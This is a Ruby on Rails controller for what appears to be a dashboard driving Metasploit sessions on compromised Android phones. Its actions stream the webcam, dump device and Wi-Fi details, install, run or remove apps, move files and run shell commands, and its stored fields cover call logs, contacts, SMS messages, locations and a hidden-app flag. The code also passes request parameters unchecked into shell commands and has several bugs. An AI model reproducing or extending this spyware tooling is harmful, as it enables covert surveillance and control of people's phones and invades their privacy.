
class SmartphonesController < InheritedResources::Base
  @@isWebcamRecordOn=false

  def dump_sysinfo
    processCommand="sysinfo"
    commandOutput=start_msf_process(processCommand)
    respond_to do |format|
        format.js { render "dump_sysinfo", :locals => {:commandOutput => commandOutput}  }
      end
  end

  def webcam_record
    commandOutput=[]
    if !@@isWebcamRecordOn
        commandTimeout=params[:exec_timeout].to_i
        camera=params[:back_camera] == "true" ? '1' : '2'
        currentTime = DateTime.now
        currentTimeFormat=currentTime.strftime("%Y%m%d%H%M%S")
        @fileNameJpeg= "webcam_record_" + currentTimeFormat + '.jpeg'
        @fileNameHtml= "webcam_record_" + currentTimeFormat + '.html'
        processCommand="webcam_stream -v false -i #{camera} -s #{@fileNameJpeg} -t #{@fileNameHtml}"
        commandOutput=start_msf_process(processCommand)
        isOperationSuccessful=false
        1.upto(commandTimeout) do |n|
            if system("docker exec kali_container sh -c \"ls | grep #{@fileNameHtml}\"")
              isOperationSuccessful = true
              @@isWebcamRecordOn = true
              break
            else
                puts "Waiting ..."
            end
            sleep 1
        end
        commandOutput=["Operation Failed"] if not isOperationSuccessful
    else
        commandOutput.append('Control+Z')
        commandOutput.append(detach_session)
        @@isWebcamRecordOn = false
    end
    respond_to do |format|
        format.js { render "webcam_record", :locals => {:commandOutput => commandOutput, :fileName => @fileNameHtml}  }
      end
end





def set_audio_mode
  processCommand="set_audio_mode -m #{@@soundMode}"
  commandOutput=start_msf_process(processCommand)
  @@soundMode=@@soundMode == 2 ? 0 : 2
  respond_to do |format|
      format.js { render "set_audio_mode", :locals => {:commandOutput => commandOutput}  }
    end
end





def dump_wifi_info
    begin
        if @@isAdbConnected
            commandOutput=run_adb_command('shell "dumpsys wifi | grep SSID: | grep -v rt="')
        else
            start_msf_process("shell")
            processCommand='dumpsys wifi | grep SSID: | grep -v rt='
            commandOutput=start_msf_process(processCommand)
            detach_session
        end
    rescue
        commandOutput="Operation Failed"
        puts "Error dumping wi-fi info."
    end
    respond_to do |format|
        format.js { render "dump_wifi_info", :locals => {:commandOutput => commandOutput.split('\n')}  }
    end
end





def dump_localtime
  processCommand="localtime"
  commandOutput=start_msf_process(processCommand)
  respond_to do |format|
      format.js { render "dump_localtime", :locals => {:commandOutput => commandOutput}  }
    end
end





def uninstall_app
    begin
        appName=params[:app]
        if ! appName.empty?
            if @@isAdbConnected
              commandOutput=run_adb_command("uninstall #{appName}")
            else
              processCommand="app_uninstall #{params[:app]}"
              commandOutput=start_msf_process(processCommand)
            end
        end
        commandOutput=["Installation done."]
    rescue
        commandOutput=["Operation Failed"]
        puts "Error uninstalling app."
    end
    respond_to do |format|
        format.js { render "uninstall_app", :locals => {:commandOutput => commandOutput}  }
    end
end





def list_apps
    begin
        apps_type=params[:system_apps] == 'true' ? '-s' : '-u'
        if @@isAdbConnected
            commandOutput=run_adb_command('shell "pm list packages"').split("\n")
        else
            processCommand="app_list #{apps_type}"
            commandOutput=start_msf_process(processCommand)
        end
    rescue
        commandOutput=["Operation Failed"]
        puts "Error listing apps." 
    end
    respond_to do |format|
        format.js { render "list_apps", :locals => {:commandOutput => commandOutput}  }
    end
end




def upload_file
  if @@isAdbConnected
      commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 push #{params[:filePath]} /sdcard/`
  else
      processCommand='upload #{params[:filePath]}'
      commandOutput=start_msf_process(processCommand)
  end
      respond_to do |format|
      format.js { render "upload_file", :locals => {:commandOutput => commandOutput.split('\n')}  }
    end
end





def wake_lock
  processCommand="wakelock -r"
  commandOutput=start_msf_process(processCommand)
  puts commandOutput

  respond_to do |format|
      format.js { render "wake_lock", :locals => {:commandOutput => commandOutput}  }
    end
end




def run_shell_command
  if @@isAdbConnected
      commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell ls`
  else
      start_msf_process("shell")
      processCommand='#{params[:shellCommand]}'
      commandOutput=start_msf_process(processCommand)
      detach_session
  end
      respond_to do |format|
      format.js { render "run_shell_command", :locals => {:commandOutput => commandOutput.split('\n')}  }
    end
end





def open_app
  if @@isAdbConnected
    commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 run #{params[:app_name]}`
  else
    processCommand="app_run #{params[:app_name]}"
    commandOutput=start_msf_process(processCommand)
end
respond_to do |format|
    format.js { render "open_app", :locals => {:commandOutput => commandOutput}  }
  end
end





def install_app
  if @@isAdbConnected
    commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 install #{params[:app_name]}`
  else
    processCommand="app_install #{params[:app_name]}"
    commandOutput=start_msf_process(processCommand)
end
respond_to do |format|
    format.js { render "install_app", :locals => {:commandOutput => commandOutput}  }
  end
end




def dump_device_info
  if @@isAdbConnected
    commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell getprop ro.product.model`
  else
    start_msf_process("shell")
    processCommand='getprop ro.product.model'
    commandOutput=start_msf_process(processCommand)
    detach_session
end
respond_to do |format|
    format.js { render "dump_device_info", :locals => {:commandOutput => commandOutput}  }
  end
end




def pull_file
  if @@isAdbConnected
      commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 pull #{params[:filePath]} /sdcard/`
  else
      processCommand='pull #{params[:filePath]}'
      commandOutput=start_msf_process(processCommand)
  end
      respond_to do |format|
      format.js { render "upload_file", :locals => {:commandOutput => commandOutput.split('\n')}  }
    end
end












    



    


    


    def dropdown_list_smartphones
        render locals: {smartphones: smartphones, smartphone:smartphone}
      end

    def select_smartphone
        redirect_to controller: 'admin/dashboard', action: 'index', selected_smartphone_id: params[:smartphone_id]
    end


    def load
        render
    end

    def install
        path = "installsomething.txt"
        content = "data from the form"
        File.open(path, "w+") do |f|
        f.write(content)
        end
    end





    

  private

    def smartphone_params
      params.require(:smartphone).permit(:operating_system, :name, :pictures, :screenshots, :videos, :recordings, :is_rooted, :call_logs, :contacts, :sms_messages, :geo_locations, :is_app_hidden)
    end





end
